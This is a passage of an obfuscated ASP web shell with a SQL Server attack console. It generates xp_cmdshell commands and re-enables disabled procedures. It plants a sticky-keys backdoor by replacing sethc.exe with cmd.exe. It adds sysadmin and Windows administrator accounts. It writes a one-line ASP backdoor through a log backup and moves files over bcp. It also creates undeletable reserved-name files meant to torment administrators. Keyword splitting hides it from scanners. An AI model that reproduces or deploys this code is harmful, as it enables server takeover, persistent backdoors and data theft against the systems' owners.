iiit"text","lqbip",lqbip,"60%","",""
fkv"Save","20%"
uemp
abxky 0
doTd"Content",""
lhue "ogda","",10
echo"<td>"
jwik"vujc",1,"Move myself there","onclick='javascript:document.getElementById(""ogda"").disabled=this.checked'"
echo"</td>"
uemp
abxky 1
echo"<td>"
rycpp"fileName","100%",""
exhpr"aux.asp","aux.asp"
exhpr"con.asp","con.asp"
exhpr"com1.asp","com1.asp"
exhpr"com2.asp","com2.asp"
exhpr"nul.asp","nul.asp"
exhpr"prn.asp","prn.asp"
ild
echo"</td>"
mwt"<td colspan='2'>Cannot del,cannot open in ordinary way,this will drive the web administrator madness :)</td>"
uemp
guenn
gbqwf
viwe
End Sub
Sub awsr()
If Not ydnj Then On Error Resume Next
If lqog="" Or Not IsNumeric(lqog) Then
lqog=Request.Cookies("lqog")
Else
Response.Cookies("lqog")=lqog
End If
If lqog="" Or Not IsNumeric(lqog) Then lqog=nhbqw
If ihk=""Then ihk=Request.Cookies(wseta&"ihk")
uhrpj()
If ihk<>""Then
Select Case qtylw
Case"wse"
wse()
Case"usa"
usa()
Case"msbca"
msbca()
Case"sls","ttjm"
fomgk()
Case Else
zwg()
End Select
End If
tbr
viwe
End Sub
Sub uhrpj()
Dim rs,yylxy,kzw,zwtp
If Not ydnj Then On Error Resume Next
ajg("Database Operation")
cxaqj True
mwt"Connect String : "
zesc"text","ihk",ihk,160,""
echo" "
mwt"page size : "
zesc"text","lqog",lqog,5,""
qjr"OK"
gbqwf
csyfy"GetConnectString",True
sodx"80%"
abxky 1
doTd"SqlOleDb","10%"
mwt"<td style=""width:80%"">Server:"
zesc"text","MsServer","127.0.0.1","15",""
echo" Username:"
zesc"text","MsUser","sa","10",""
echo" Password:"
zesc"text","MsPass","","10",""
echo" DataBase:"
zesc"text","DBPath","","10",""
jwik "MsSspi","1","Windows Authentication",""
echo"</td>"
iiit"button","","Generate","10%","onClick=""javascript:tywoa(MsServer.value,MsUser.value,MsPass.value,DBPath.value,MsSspi.checked)""",""
uemp
abxky 0
doTd"Jet",""
mwt"<td>DB path:"
zesc"text","accdbpath",nzax&"\","82",""
echo"</td>"
iiit"button","","Generate","10%","onClick=""javascript:kew(accdbpath.value)""",""
uemp
guenn
echo"</span><hr>"
If Err Then Err.clear
If ihk<>""Then
lswls ihk
suzn wseta&"ihk",ihk
Set rs=nfffq("Ad"+oge+"odb.R"+zui+"ecordSet")
rs.Open "select @@version,db_name()",conn,1,1
If Err Then
acjdi="access"
Err.clear
Set rs=Nothing
Set rs=nfffq("Ad"+oge+"odb.R"+zui+"ecordSet")
rs.Open "select cstr('access')",conn,1,1
If Err Then
acjdi="others"
Err.clear
End If
rs.Close
Set rs=Nothing
Else
ryfj=rs(0)
podw=rs(1)
rs.close
acjdi="mssql"
%>
<script>
var oonsd='';function zfzf(path){var regRoot=dzzx(path,'\\',true);path=path.substr(regRoot.length+1);var regKey=zsz(path,'\\');var aiw=dzzx(path,'\\',false);return(new Array(regRoot,aiw,regKey));}function ekt(knfe){form2.ybgqm.value="exec mast"+oonsd+"er..xp"+oonsd+"_cmdshell '"+knfe+"'";}function sxubi(aiw){var regarr=zfzf(aiw);form2.ybgqm.value="exec mast"+oonsd+"er..xp_regread '"+regarr[0]+"','"+regarr[1]+"','"+regarr[2]+"'";}function lkae(nxfic){form2.ybgqm.value="exec mast"+oonsd+"er..xp_dirtree '"+nxfic+"',1,1";}function azohr(ths,cpbdz,ltkwa){if(ltkwa==2){form2.ybgqm.value="if object_id('dark_temp')is not null drop table dark_temp;create table dark_temp(aa nvarchar(4000));bulk insert dark_temp from'"+cpbdz+"'";}else{form2.ybgqm.value="declare @a int;exec mast"+oonsd+"er..sp_oacr"+oonsd+"eate'WS"+oonsd+"cript.She"+oonsd+"ll',@a output;exec mast"+oonsd+"er..sp_oameth"+oonsd+"od @a,'run',null,'"+ths+" > "+cpbdz+"',0,'true'";}}function ojlqe(net,cmj,vxeyd,nspwd){switch(nspwd){case '1':form2.ybgqm.value="exec mast"+oonsd+"er..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTW"+oonsd+"ARE\Microsoft\Jet\4.0\En"+oonsd+"gines','SandBo"+oonsd+"xMode','REG_DWORD',0";break;case '2':net=net.replace(/"/g,'""');form2.ybgqm.value="Select * From openro"+oonsd+"wSet('Microsoft.Jet.OLEDB.4.0',';Database="+cmj+"','select shell(\""+net+" > "+vxeyd+"\")')";break;case '3':form2.ybgqm.value="if object_id('dark_temp')is not null drop table dark_temp;create table dark_temp(aa nvarchar(4000));bulk insert dark_temp from'"+vxeyd+"'";break;}}function jxw(ggwz,wvkc){form2.ybgqm.value="declare @a int;exec mast"+oonsd+"er..sp_oacr"+oonsd+"eate'Scriptin"+oonsd+"g.FileSystemObj"+oonsd+"ect',@a output;exec mast"+oonsd+"er..sp_oameth"+oonsd+"od @a,'CopyFile',null,'"+ggwz+"','"+wvkc+"'";}function wfrtn(fhbej,tcppp){form2.ybgqm.value="exec mast"+oonsd+"er..xp_makecab 'C:\\windows\\temp\\~098611.tmp','default',1,'"+fhbej+"';exec mast"+oonsd+"er..xp_unpackcab 'C:\\windows\\temp\\~098611.tmp','"+dzzx(tcppp,"\\",false)+"',1,'"+zsz(tcppp,"\\")+"'";}function cuuu(anpj,xppp){form2.ybgqm.value="use mast"+oonsd+"er;dbcc addextEndedpr"+oonsd+"oc('"+anpj+"','"+xppp+"')";}function bud(wpy){form2.ybgqm.value="use mast"+oonsd+"er;dbcc dropextEndedproc('"+wpy+"')";}function tekgs(epvr){form2.ybgqm.value="exec mast"+oonsd+"er..sp_configure 'show advanced options',1;RECONFIGURE;EXEC mast"+oonsd+"er..sp_configure '"+epvr+"',1;RECONFIGURE";}function zhjsq(zsaq,pqote,qgi){var regarr=zfzf(zsaq);if (pqote=="REG_SZ"){qgi="'"+qgi+"'";}form2.ybgqm.value="exec mast"+oonsd+"er..xp_regwrite '"+regarr[0]+"','"+regarr[1]+"','"+regarr[2]+"','"+pqote+"',"+qgi;}function oqwdw(name,pass){form2.ybgqm.value="exec mast"+oonsd+"er..sp_addlogin '"+name+"','"+pass+"';exec mast"+oonsd+"er..sp_add"+oonsd+"srvrolemember '"+name+"','sysadmin'";}function fkggf(name,pass){form2.ybgqm.value="declare @a int;exec mast"+oonsd+"er..sp_oacr"+oonsd+"eate 'ScriptControl',@a output;exec mast"+oonsd+"er..sp_oasetprop"+oonsd+"erty @a,'language','VBScript';exec mast"+oonsd+"er..sp_oameth"+oonsd+"od @a,'addcode',null,'sub add():Set o=CreateObject(\"She"+oonsd+"ll.Users\"):Set u=o.create(\""+name+"\"):u.Chan"+oonsd+"gePassword \""+pass+"\",\"\":u.setting(\"AccountType\")=3:end sub';exec mast"+oonsd+"er..sp_oameth"+oonsd+"od @a,'run',null,'add'";}function wdkbc(bejh,niypd,podw,wvj){switch(wvj){case '1':form2.ybgqm.value="alter database ["+podw+"] Set recovery full;dump transaction ["+podw+"] with no_log;if object_id('dark_temp')is not null drop table dark_temp;create table dark_temp(aa sql_variant primary key)";break;case '2':form2.ybgqm.value="backup database ["+podw+"] to disk='C:\\windows\\temp\\~098611.tmp' with init";break;case '3':form2.ybgqm.value="insert dark_temp values('"+bejh.replace(/'/g,"''")+"')";break;case '4':form2.ybgqm.value="backup log ["+podw+"] to disk='"+niypd+"';drop table dark_temp";break;}}function euxpo(podw){var re=/(database|initial catalog) *=[^;]+/i;if(sqlForm.ihk.value.match(re)){sqlForm.ihk.value=miig(sqlForm.ihk.value.replace(re,"$1="+podw));sqlForm.qtylw.value="zwg";sqlForm.submit();}else{alert("Can not get database name in connect string!");}}
</script>
<%
End If
If qtylw="wse"And ybgqm=""Then
If acjdi="others"Then
ybgqm="select * from "&rxg
Else
ybgqm="select * from ["&rxg&"]"
End If
End If
ozs "zwg","","","","","Show Tables",""
echo"<br>"
cxaqj True
rtas"qtylw","wse"
rtas"ihk",ihk
sodx"100%"
If acjdi="mssql"Then
abxky 1
mwt"<td colspan=4>Version : "&mszsa(ryfj)&"</td>"
uemp
yylxy="sysadmin|db_owner|public"
abxky 0
echo"<td colspan=4>"
For Each strrole in Split(yylxy,"|")
If strrole="sysadmin"Then
rs.Open "select IS_SRVROLEMEMBER('"&strrole&"')",conn,1,1
Else
rs.Open "select IS_MEMBER('"&strrole&"')",conn,1,1
End If
If rs(0)=1 Then
echo "Current Privilege : <font color='red'>"&strrole&"</font> "
rs.close
Exit For
End If
rs.close
Next
echo "| Switch Database : "
rs.Open "select name from mast"+mqe+"er..sysdatabases",conn,1,1
rs.movefirst
Do While Not rs.eof
echo "<a href=javascript:euxpo('"&rs("name")&"')>"&rs("name")&"</a> | "
rs.movenext
Loop
echo"</td></tr>"
nrf
rs.close
Set rs=Nothing
End If
abxky 1
doTd"Execute Sql","10%"
lhue"ybgqm",ybgqm,5
fkv"Submit","5%"
iiit"button","","Export","5%","onClick='tort();'",""
uemp
guenn
gbqwf
If acjdi="mssql"Then
echo"Functions : "
kzw=Split("xp_cmd|xp_dir|xp_reg|xp_regw|wsexec|sbexec|fsocopy|makecab|addproc|delproc|enfunc|addlogin|addsys|logback|sls|ttjm","|")
zwtp=Split("xp"+cla+"_cmdshell|xp_dirtree|xp_regread|xp_regwrite|ws exec|sandbox exec|FSO copy|Cab copy|add procedure|del procedure|enable function|add sql user|add sys user|logbackup|saupfile|sadownfile","|")
For i=0 To UBound(kzw)
echo"<a href='#' onClick=""javascript:bik("&kzw(i)&")"" class='hidehref'>"&zwtp(i)&"</a> | "
Next
echo"<br><br>"
uxmhj"xp_cmd",True
sodx"100%"
abxky 1
doTd"com"+nhmkc+"mand","10%"
iiit"text","knfe","net u"+rmct+"ser","80%","",""
iiit"button","","Generate","10%","onClick=""javascript:ekt(knfe.value)""",""
uemp
guenn
echo"</span>"
uxmhj"xp_dir",True
sodx"100%"
abxky 1
doTd"Path","10%"
iiit"text","nxfic",nzax,"80%","",""
iiit"button","","Generate","10%","onClick=""javascript:lkae(nxfic.value)""",""
uemp
guenn
echo"</span>"
uxmhj"xp_reg",True
sodx"100%"
abxky 1
doTd"Path","10%"
iiit"text","xpregpath","HKEY_LOCAL_MACHINE\SYSTEM\Curre"+fewse+"ntControlSet\Control\ComputerNa"+wwva+"me\ComputerNa"+wwva+"me\ComputerNa"+wwva+"me","80%","",""
iiit"button","","Generate","10%","onClick=""javascript:sxubi(xpregpath.value)""",""
uemp
guenn
echo"</span>"
uxmhj"xp_regw",True
sodx"100%"
abxky 1
doTd"Path","10%"
iiit"text","zsaq","HKEY_LOCAL_MACHINE\SOFTW"+wjw+"ARE\Microsoft\Window"+zfd+"s NT\Curren"+suctf+"tVersion\Image File Execution Options\Sethc.exe\debugger","80%","","4"
uemp
abxky 0
doTd"Type",""
echo"<td width='30%'>"
rycpp"pqote","100%",""
exhpr "REG_SZ","REG_SZ"
exhpr "REG_DWORD","REG_DWORD"
exhpr "REG_BINARY","REG_BINARY"
ild
echo"</td>"
doTd"Value",""
iiit"text","qgi","cmd.exe","40%","",""
iiit"button","","Generate","10%","onClick=""javascript:zhjsq(zsaq.value,document.all.pqote.value,qgi.value)""",""
uemp
guenn
echo"</span>"
uxmhj"wsexec",True
sodx"100%"
abxky 1
doTd"com"+nhmkc+"mand","10%"
iiit"text","ths","cmd /c net u"+rmct+"ser","","","4"
uemp
abxky 0
doTd"Temp File",""
iiit"text","cpbdz","C:\WINDOWS\Temp\~098611.tmp","50%","",""
doTd"Step","20%"
echo"<td width='10%'>"
rycpp"ltkwa","100%",""
exhpr 1,1
exhpr 2,2
ild
echo"</td>"
iiit"button","","Generate","10%","onClick=""javascript:azohr(ths.value,cpbdz.value,document.all.ltkwa.value)""",""
uemp
guenn
echo"</span>"
uxmhj"sbexec",True
sodx"100%"
abxky 1
doTd"com"+nhmkc+"mand","10%"
iiit"text","net","cmd /c net u"+rmct+"ser","","","5"
uemp
abxky 0
doTd"Mdb Path",""
iiit"text","cmj","C:\windows\syste"+xyjdv+"m32\ias\ias.mdb","30%","",""
doTd"Temp File","10%"
iiit"text","vxeyd","C:\WINDOWS\Temp\~098611.tmp","30%","",""
echo"<td width='10%'>Step "
rycpp"nspwd","40px",""
exhpr 1,1
exhpr 2,2
exhpr 3,3
ild
echo"</td>"
iiit"button","","Generate","10%","onClick=""javascript:ojlqe(net.value,cmj.value,vxeyd.value,document.all.nspwd.value)""",""
uemp
guenn
echo"</span>"
uxmhj"fsocopy",True
sodx"100%"
abxky 1
doTd"Source","10%"
iiit"text","ggwz","C:\WINDOWS\syste"+xyjdv+"m32\cmd.exe","35%","",""
doTd"Target","10%"
iiit"text","wvkc","C:\WINDOWS\syste"+xyjdv+"m32\Sethc.exe","35%","",""
iiit"button","","Generate","10%","onClick=""javascript:jxw(ggwz.value,wvkc.value)""",""
uemp
guenn
echo"</span>"
uxmhj"makecab",True
sodx"100%"
abxky 1
doTd"Source","10%"
iiit"text","fhbej","C:\WINDOWS\syste"+xyjdv+"m32\cmd.exe","35%","",""
doTd"Target","10%"
iiit"text","tcppp","C:\WINDOWS\syste"+xyjdv+"m32\Sethc.exe","35%","",""
iiit"button","","Generate","10%","onClick=""javascript:wfrtn(fhbej.value,tcppp.value)""",""
uemp
guenn
echo"</span>"
uxmhj"addproc",True
sodx"80%%"
abxky 1
doTd"Procedure","20%"
echo"<td width='20%'>"
rycpp"anpj","100%",""
exhpr "xp"+cla+"_cmdshell","xp"+cla+"_cmdshell"
exhpr "xp_dirtree","xp_dirtree"
exhpr "xp_regread","xp_regread"
exhpr "xp_regwrite","xp_regwrite"
exhpr "sp_oacr"+mml+"eate","sp_oacr"+mml+"eate"
ild
doTd"DLL","20%"
echo"<td width='20%'>"
rycpp"xppp","100%",""
exhpr "xplog"+nmdg+"70.dll","xplog"+nmdg+"70.dll"
exhpr "xpstar.dll","xpstar.dll"
exhpr "odsole70.dll","odsole70.dll"
ild
iiit"button","","Generate","20%","onClick=""javascript:cuuu(document.all.anpj.value,document.all.xppp.value)""",""
uemp
guenn
echo"</span>"
uxmhj"delproc",True
sodx"40%"
abxky 1
doTd"Procedure","30%"
echo"<td width='40%'>"
rycpp"wpy","100%",""
exhpr "xp"+cla+"_cmdshell","xp"+cla+"_cmdshell"
exhpr "xp_dirtree","xp_dirtree"
exhpr "xp_regread","xp_regread"
exhpr "xp_regwrite","xp_regwrite"
exhpr "sp_oacr"+mml+"eate","sp_oacr"+mml+"eate"
ild
echo"</td>"
iiit"button","","Generate","30%","onClick=""javascript:bud(document.all.wpy.value)""",""
uemp
guenn
echo"</span>"
uxmhj"enfunc",True
sodx"40%"
abxky 1
doTd"Function","30%"
echo"<td width='40%'>"
rycpp"epvr","100%",""
exhpr "xp"+cla+"_cmdshell","xp"+cla+"_cmdshell"
exhpr "Ole Automation Procedures","sp_oacr"+mml+"eate"
exhpr "Ad Hoc Distributed Queries","openro"+unw+"wSet"
ild
echo"</td>"
iiit"button","","Generate","30%","onClick=""javascript:tekgs(document.all.epvr.value)""",""
uemp
guenn
echo"</span>"
uxmhj"addlogin",True
sodx"80%"
abxky 1
doTd"Username","10%"
iiit"text","addusername","admin$","30%","",""
doTd"Password","10%"
iiit"text","adduserpass","fuckyou","30%","",""
iiit"button","","Generate","20%","onClick=""javascript:oqwdw(addusername.value,adduserpass.value)""",""
uemp
guenn
echo"</span>"
uxmhj"addsys",True
sodx"80%"
abxky 1
doTd"Username","10%"
iiit"text","sysname","admin$","30%","",""
doTd"Password","10%"
iiit"text","syspass","fuckyou","30%","",""
iiit"button","","Generate","20%","onClick=""javascript:fkggf(sysname.value,syspass.value)""",""
uemp
guenn
echo"</span>"
uxmhj"logback",True
sodx"100%"
abxky 1
doTd"Content","10%"
echo"<td colspan='4'>"
eks"bejh","<%response.clear:execute request(""value""):response.End%"&">","100%",5,""
echo"</td>"
iiit"button","","Generate","10%","onClick=""javascript:wdkbc(bejh.value,niypd.value,logdb.value,document.all.logstep.value)""",""
uemp
abxky 0
doTd"Path","10%"
iiit"text","niypd",wxw(".")&"\system.asp","40%","",""
doTd"Database","10%"
iiit"text","logdb",podw,"20%","",""
doTd"Step","10%"
echo"<td width='10%'>"
rycpp"logstep","100%",""
exhpr 1,1
exhpr 2,2
exhpr 3,3
exhpr 4,4
ild
echo"</td>"
uemp
guenn
echo"</span>"
uxmhj"sls",True
mwt"<form method=""post"" id=""saform""action="""&cngn&"""enctype=""multipart/form-data"">"
rtas"goaction",goaction
rtas"qtylw","sls"
rtas"ihk",ihk
sodx"100%"
abxky 1
iiit"file","fomgk","","30%","",""
mwt"<td align='right'>Save as(full path):</td>"
iiit"text","lqbip","","40%","",""
iiit"button","","Upload","10%","onClick=""javascript:qjr('"&goaction&"','fomgk','')""",""
uemp
guenn
gbqwf
echo"</span>"
uxmhj"ttjm",True
cxaqj True
rtas"qtylw","ttjm"
rtas"ihk",ihk
sodx"100%"
abxky 1
doTd"Remoto file(full path)",""
iiit"text","wckz","","30%","",""
doTd"Save as",""
iiit"text","lqbip",nzax,"30%","",""
fkv"Download","10%"
uemp
guenn
gbqwf
echo"</span>"
End If
echo"<hr>"
End If
End Sub
Sub usa()
If Not ydnj Then On Error Resume Next
If acjdi<>"others" Then rxg="["&rxg&"]"
conn.Execute"drop table "&rxg,-1,&H0001
If Err Then
tvnm(Err)
Else
yln("Table deleted.")
End If
zwg()
End Sub
Sub msbca()
Dim rs,i,sxip
If Not ydnj Then On Error Resume Next
If ybgqm="" Then
sxip=rxg
If acjdi<>"others" Then rxg="["&rxg&"]"
ybgqm="select * from "&rxg
Else
sxip="export"
End If
i=0
Set rs=conn.Execute(ybgqm,-1,&H0001)
ome(Err)
If rs.Fields.Count>0 Then
Response.Clear
Session.CodePage=936
Response.Status="200 OK"
Response.AddHeader"Content-Disposition","Attachment; Filename="&sxip&".txt"
Session.CodePage=65001
Response.AddHeader"Content-Type","text/html"
For i=0 To rs.Fields.Count-1
echo CStr(rs.Fields(i).Name)
If i<rs.Fields.Count-1 Then echo Chr(9)
Next
echo vbCrLf
Do Until rs.EOF
For i=0 To rs.Fields.Count-1
echo CStr(rs(i))
If i<rs.Fields.Count-1 Then echo Chr(9)
Next
echo vbCrLf
rs.MoveNext
i=i+1
If i>=20 Then
i=0
Response.Flush()
End If
Loop
Else
yln"It's empty."
zwg()
viwe
End If
rs.Close
Set rs=Nothing
response.End
End Sub
Sub fomgk()
qqp="8.0|1|1       SQLIMAGE      0       {size}       """"                        1     binfile     """"|"
conn.execute "If object_id('dark_temp')is not null drop table dark_temp"
If InStr(ryfj,"Microsoft SQL Server 2005")>0 Then
qqp=Replace(qqp,"8.0","9.0")
conn.execute("EXEC mast"+mqe+"er..sp_configure 'show advanced options', 1;RECONFIGURE;EXEC mast"+mqe+"er..sp_configure 'xp"+cla+"_cmdshell', 1;RECONFIGURE;")
End If
If qtylw="ttjm"Then
Dim rs,size
If lqbip=""Or wckz="" Then
yln"Not enough parameters."
zwg()
viwe
ElseIf InstrRev(wckz,".")<InstrRev(wckz,"\")Then
yln"You can't download a folder -_-~!"
zwg()
viwe
ElseIf InstrRev(lqbip,".")<InstrRev(lqbip,"\")Then
lqbip=lqbip&"\"&zsz(wckz,"\")
End If
Set rs=nfffq("Ad"+oge+"odb.R"+zui+"ecordSet")
Set rs=conn.execute("EXEC mast"+mqe+"er..xp"+cla+"_cmdshell 'dir """&wckz&""" | find """&zsz(wckz,"\")&"""'",-1,&H0001)
rs.movefirst
size=Replace(Trim(soa(rs(0)," [0-9,]+ ",False)(0)),",","")
If size=""Or Not IsNumeric(size)Then
yln("Get size error.")
viwe
End If
qqp=Replace(qqp,"{size}",size)
rs.Close
Set rs=Nothing
Else
qqp=Replace(qqp,"{size}",0)
End If
vrdgv=Split(qqp,"|")
For Each substrfrm in vrdgv
conn.execute("EXEC mast"+mqe+"er..xp"+cla+"_cmdshell 'echo "&substrfrm&" >>c:\tmp.fmt'")
Next
If qtylw="sls"Then
prlq()
Else
qdroi()
End If
conn.execute "If object_id('dark_temp')is not null drop table dark_temp"
conn.execute("EXECUTE mast"+mqe+"er..xp"+cla+"_cmdshell 'del c:\tmp.fmt'")
zwg()
End Sub
Sub prlq()
If Not ydnj Then On Error Resume Next
Dim rs,theFile,vrdgv,sblgj
If lqbip="" Then lqbip=nzax
'If InStr(lqbip,":")<1 Then lqbip=nzax&"\"&lqbip
Set theFile=pgvr.File("fomgk")
If InstrRev(lqbip,"\")>InstrRev(lqbip,".")Then lqbip=lqbip&"\"&theFile.FileName
conn.execute "CREATE TABLE [dark_temp] ([id] [int] NULL ,[binfile] [Image] NULL) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY];"
Set rs=nfffq("Ad"+oge+"odb.R"+zui+"ecordSet")
rs.Open "SELECT * FROM dark_temp where id is null",conn,1,3
rs.AddNew
rs("binfile").AppendChunk theFile.wcxc()
rs.Update
conn.execute("exec mast"+mqe+"er..xp"+cla+"_cmdshell'bcp ""select binfile from "&podw&"..dark_temp"" queryout """&lqbip&""" -T -f c:\tmp.fmt'")
set rs=conn.execute("EXECUTE mast"+mqe+"er..xp_fileexist '"&lqbip&"'")
If Err Then
tvnm(Err)
ElseIf rs(0)=1 Then 
yln("File uploaded, have fun.")
Else
yln("Upload failed, RPWT?")
End If
rs.close
Set rs=Nothing
End Sub
Sub qdroi()
Dim rs
If Not ydnj Then On Error Resume Next
conn.execute "CREATE TABLE [dark_temp] ([binfile] [Image] NULL)"
conn.execute("exec mast"+mqe+"er..xp"+cla+"_cmdshell'bcp """&podw&"..dark_temp"" in """&wckz&""" -T -f c:\tmp.fmt'")
Set rs=nfffq("Ad"+oge+"odb.R"+zui+"ecordSet")
rs.Open "select * from dark_temp",conn,1,1
woli lqbip,rs(0),1
If Err Then
tvnm(Err)
Else
yln("File downloaded,have fun.")
End If
rs.close
Set rs=Nothing
End Sub
Sub zwg()
Dim cwp,zfo,ote,quh,xad,vldnv,svznx,tgt
If Not ydnj Then On Error Resume Next
xad=1
ads=0
Set vldnv=conn.OpenSchema(20,Array(Empty,Empty,Empty,"table"))
ome(Err)
Dim rs
Do Until vldnv.Eof
svznx=vldnv("Table_Name")
'If acjdi<>"others" Then
'Set rs=conn.Execute("select count(*) from ["&svznx&"]")
'Else
'Set rs=conn.Execute("select count(*) from "&svznx)
'End If
'If Err Then
'tvnm(Err)
'Else
'rs.movefirst
'tgt=" ("&CStr(rs(0))&")"
'End If
gfk xad
cppp"<b>"&svznx&tgt&"</b>"
echo"<label>"
ozs "wse","","",svznx,"","Show content",""
echo"</label>"
echo"<label>"
ozs "showStructure","","",svznx,"","Show structure",""
echo"</label>"
echo"<label>"
ozs "msbca","","",svznx,"","Export",""
echo"</label>"
echo"<label>"
ozs "usa","","",svznx,"","Delete",""
echo"</label>"
If qtylw="showStructure"And rxg=vldnv("Table_Name")Then
Set rsColumn=conn.OpenSchema(4,Array(Empty,Empty,vldnv("Table_Name").value))
echo"<span>"
echo"<center>"
sodx"80%"
abxky ads
nrf
doTd"Name",""
doTd"Type",""
doTd"Size",""
doTd"Nullable",""
uemp
Do Until rsColumn.Eof
ote=rsColumn("Character_Maximum_Length")
If ote="" Then ote=rsColumn("Is_Nullable")
abxky ads
doTd rsColumn("Column_Name"),""
doTd fge(rsColumn("Data_Type")),""
doTd ote,""
doTd rsColumn("Is_Nullable"),""
uemp
nrf
rsColumn.MoveNext
Loop
guenn
echo"</center></span>"
End If
mwt"<br></span>"
nrf
xad=xad+1
If xad=2 Then xad=0
vldnv.MoveNext
Loop
Set vldnv=Nothing
Set rsColumn=Nothing
tvnm(Err)
End Sub
Sub wse()
Dim i,j,x,rs,bac,dot,doi,zwsq,k
If Not ydnj Then On Error Resume Next
Set rs=nfffq("Ad"+oge+"odb.R"+zui+"ecordSet")
k=0
zeb
If Lcase(Left(ybgqm,7))="select " And acjdi<>"others" Then
If fkho=""Or Not IsNumeric(fkho)Then fkho=1
rs.Open ybgqm,conn,1,1
ome(Err)
fkho=CLng(fkho)
rs.PageSize=lqog
If Not rs.Eof Then
rs.AbsolutePage=fkho
End If
If rs.Fields.Count > 0 Then
echo"<table width='100%' cellspacing='0' border='0' style='border-width:0px;'>"
abxky 1
For j=0 To rs.Fields.Count-1
ycd mszsa(rs.Fields(j).Name)
Next
uemp
ads=0
For i=1 To rs.PageSize
If rs.Eof Then Exit For
abxky ads
For j=0 To rs.Fields.Count-1
doTd mszsa(rs(j)),""
Next
uemp
nrf
rs.MoveNext
Next
End If
abxky ads
doi=Int(rs.RecordCount/lqog)
If rs.RecordCount Mod lqog>0 Then doi=doi+1
echo"<td colspan="&rs.Fields.Count&">"
mwt rs.RecordCount&" records in total,"&doi&" pages. "
ozs "wse","","",rxg,"1",mszsa("<<First page"),mszsa(" ")
zwsq=""
If rxg=""Then zwsq=Replace(ybgqm,"'","\'")
If fkho>2 Then
echo mszsa(" ")
ozs "wse","",zwsq,rxg,fkho-1,mszsa("<Last"),""
End If
echo mszsa(" ")
mwt"<a href=""javascript:abckx('wse','','"&zwsq&"','"&rxg&"',document.getElementById('gotoPage').value)"">Go to</a>"
zesc"text","gotoPage",fkho,"3",""
If CLng(fkho)<(doi-1) Then
echo mszsa(" ")
ozs "wse","",zwsq,rxg,fkho+1,mszsa("Next>"),""
End If
echo mszsa(" ")
ozs "wse","",zwsq,rxg,doi,mszsa("Last page>>"),""
echo"</td>"
uemp
guenn
rs.Close
Set rs=Nothing
Else
Set rs=conn.Execute(ybgqm,-1,&H0001)
ome(Err)
If rs.Fields.Count>0 Then
sodx"100%"
abxky 1
For i=0 To rs.Fields.Count-1
ycd mszsa(rs.Fields(i).Name)
Next
uemp
ads=0
Do Until rs.EOF
abxky ads
For i=0 To rs.Fields.Count-1
ycd mszsa(rs(i))
Next
uemp
rs.MoveNext
nrf
k=k+1
If k>=20 Then
k=0
Response.Flush()
End If
Loop
guenn
rs.Close
Else
yln"Query got null recordSet."
End If
Set rs=Nothing
End If
tvnm(Err)
End Sub
Sub lswls(ihk)
If Not ydnj Then On Error Resume Next
Set conn=nfffq("Ad"+oge+"odb.Connecti"+wehbe+"on")
conn.Open ihk
conn.CommandTimeout=300
ome(Err)
End Sub
Sub tbr()
If Not ydnj Then On Error Resume Next
If IsObject(conn)Then
conn.Close
Set conn=Nothing
End If
End Sub
Function fge(flag)
Dim str
Select Case flag
Case 0: str="EMPTY"
Case 2: str="SMALLINT"
Case 3: str="INTEGER"
Case 4: str="SINGLE"
Case 5: str="DOUBLE"
Case 6: str="CURRENCY"
Case 7: str="DATE"
Case 8: str="BSTR"
Case 9: str="IDISPATCH"
Case 10: str="ERROR"
Case 11: str="BIT"
Case 12: str="VARIANT"
Case 13: str="IUNKNOWN"
Case 14: str="DECIMAL"
Case 16: str="TINYINT"
Case 17: str="UNSIGNEDTINYINT"
Case 18: str="UNSIGNEDSMALLINT"
Case 19: str="UNSIGNEDINT"
Case 20: str="BIGINT"
Case 21: str="UNSIGNEDBIGINT"
Case 72: str="GUID"
Case 128: str="BINARY"
Case 129: str="CHAR"
Case 130: str="VARCHAR"
Case 131: str="NUMERIC"
Case 132: str="USERDEFINED"
Case 133: str="DBDATE"
Case 134: str="DBTIME"
Case 135: str="DBTIMESTAMP"
Case 136: str="CHAPTER"
Case 200: str="WCHAR"
Case 201: str="TEXT"
Case 202: str="NVARCHAR"
Case 203: str="NTEXT"
Case 204: str="VARBINARY"
Case 205: str="LONGVARBINARY"
Case Else: str=flag
End Select
fge=str
End Function
Sub unu()
If Not ydnj Then On Error Resume Next
Dim theFile,qcthd,pnhl,smr
If Right(lqbip,1)="\"Then
yln"Can't edit a directory!"
viwe
End If
pnhl=dzzx(lqbip,"\",False)
cxaqj True
If goaction="veerr"And qtylw="unu" Then
qcthd=tpcq(lqbip)
Else
qcthd=rchgv(lqbip)
End If
tvnm(Err)
eks"ogda",qcthd,"100%","40",""
If qtylw="tzsaq" Then
rtas"qtylw","evwr"
Else
rtas"qtylw","save"
End If
echo"Save as :"
zesc"text","lqbip",lqbip,"60",""
echo" Encode:"
rycpp"act","80px","onchange=""javascript:if(this.value!=''){qjr('"&goaction&"',this.value,'"&clwc(lqbip)&"');}"""
exhpr"unu","Default"
smr="<option value=""tzsaq"" {$}>Utf-8</option>"
If qtylw="tzsaq" Then
smr=Replace(smr,"{$}","selected")
End If
echo smr
ild
echo" "
qjr"Save"
echo" "
zesc"reset","","ReSet","",""
echo" "
zesc"button","clear","Clear","","onClick=""javascript:this.form.ogda.innerText=''"""
echo" "
zesc"button","","Go back","","onClick=""javascript:qjr('"&goaction&"','','"&clwc(pnhl)&"')"""
echo" "
jwik "ktg","1","Remain Last Modify Date","checked"
echo" "
jwik "ghpc","1","Encrypt File Content","onclick='javascript:vtbqk()'"
gbqwf
tvnm(Err)
viwe
End Sub
Sub yjzdg()
Dim phebk,azchf,fuav,ybrxe,wclm,avl,rovcg
If Not ydnj Then On Error Resume Next
If ghpc=1 Then
ogda=mdez(ogda)
End If
wclm=0
If IsObject(xjab)Then
Set azchf=xjab.GetFile(lqbip)
fuav=whc(azchf.Attributes)
For Each ybrxe In fuav
If ybrxe="system"Then
azchf.Attributes=azchf.Attributes-4
wclm=wclm+4
ElseIf ybrxe="hidden"Then
azchf.Attributes=azchf.Attributes-2
wclm=wclm+2
ElseIf ybrxe="readonly"Then
azchf.Attributes=azchf.Attributes-1
wclm=wclm+1
End If
Next
End If
If IsObject(zjhor)And ktg Then
execute "Set phebk=zjhor.N"&zfaaz&"ameSpace(dzzx(lqbip,""\"",False))"
Set avl=phebk.ParseName(zsz(lqbip,"\"))
rovcg=avl.ModIfyDate
End If
If goaction="veerr"And qtylw="save" Then
ekg lqbip,ogda
Else
woli lqbip,ogda,2
End If
If Err Then
tvnm(Err)
Else
yln"File saved."
End If
